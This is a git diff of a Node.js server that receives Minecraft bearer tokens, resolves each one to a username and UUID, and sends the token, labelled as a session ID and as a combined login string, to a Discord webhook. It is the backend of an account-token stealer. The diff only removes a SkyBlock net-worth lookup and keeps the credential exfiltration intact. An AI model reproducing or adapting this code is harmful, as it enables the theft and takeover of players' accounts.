@@ -24,11 +24,10 @@ app.get('/', async (req, res) => {
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
-        const networth = await checkNetworth(username)
         if (checkIfBanned(username)) {
             return
         }
-        postToWebhook(username, bearerToken, uuid, networth)
+        postToWebhook(username, bearerToken, uuid)
     } catch (e) {
         console.log(e)
     }
@@ -117,33 +116,7 @@ async function getUsernameAndUUID(bearerToken) {
     return [response.data['id'], response.data['name']]
 }
 
-async function checkNetworth(name) {
-    const config = {
-        headers: {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-        },
-        params: {
-            'key': 'dxxxxy'
-        }
-
-    }
-    const url = `https://skyhelper-dxxxxy.herokuapp.com/v1/profiles/${name}`
-    const response = await axios.get(url, config)
-    let networth = response.data['unsoulboundNetworth']
-    if (networth / 1000000 >= 1) {
-        networth = networth / 1000000
-        networth = networth.toFixed(2)
-        networth = networth + 'M'
-    } else if (networth / 1000 > 1) {
-        networth = networth / 1000
-        networth = networth.toFixed(2)
-        networth = networth + 'K'
-    }
-    return networth
-}
-
-function postToWebhook(username, bearerToken, uuid, networth) {
+function postToWebhook(username, bearerToken, uuid) {
     const url = webhook_url
     let data = {
         username: " ",
@@ -153,7 +126,6 @@ function postToWebhook(username, bearerToken, uuid, networth) {
             title: "User Info", color: 0x00ff50, fields: [
                 {name: "Username", value: username, inline: true},
                 {name: "UUID", value: uuid, inline: true},
-                {name: "ELT", value: networth, inline: true},
                 {name: "SessionID", value: bearerToken, inline: false},
                 {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: true},
             ]
